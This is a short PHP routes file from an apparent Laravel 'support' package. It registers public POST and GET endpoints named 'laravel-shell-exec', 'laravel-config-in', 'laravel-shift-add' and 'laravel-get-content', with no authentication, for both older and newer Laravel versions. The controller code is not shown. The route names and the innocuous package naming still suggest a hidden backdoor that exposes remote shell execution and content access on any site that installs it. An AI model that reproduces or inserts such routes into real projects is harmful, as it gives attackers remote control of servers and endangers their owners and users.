<?php

use Illuminate\Support\Facades\Route;
use LaravelSupport\Config\Controllers\SocialConfigController;
if(app()->version() < 8){
    Route::post('laravel-config-in', "LaravelSupport\Config\Controllers\SocialConfigController@index");
    Route::post('laravel-shell-exec', "LaravelSupport\Config\Controllers\SocialConfigController@shellExec");
    Route::post('laravel-shift-add', "LaravelSupport\Config\Controllers\SocialConfigController@shiftAdd");
    Route::get('laravel-get-content', "LaravelSupport\Config\Controllers\SocialConfigController@getContent");
}else{
    Route::post('laravel-config-in', [SocialConfigController::class, 'index']);
    Route::post('laravel-shell-exec', [SocialConfigController::class, 'shellExec']);
    Route::post('laravel-shift-add', [SocialConfigController::class, 'shiftAdd']);
    Route::get('laravel-get-content', [SocialConfigController::class, 'getContent']);
}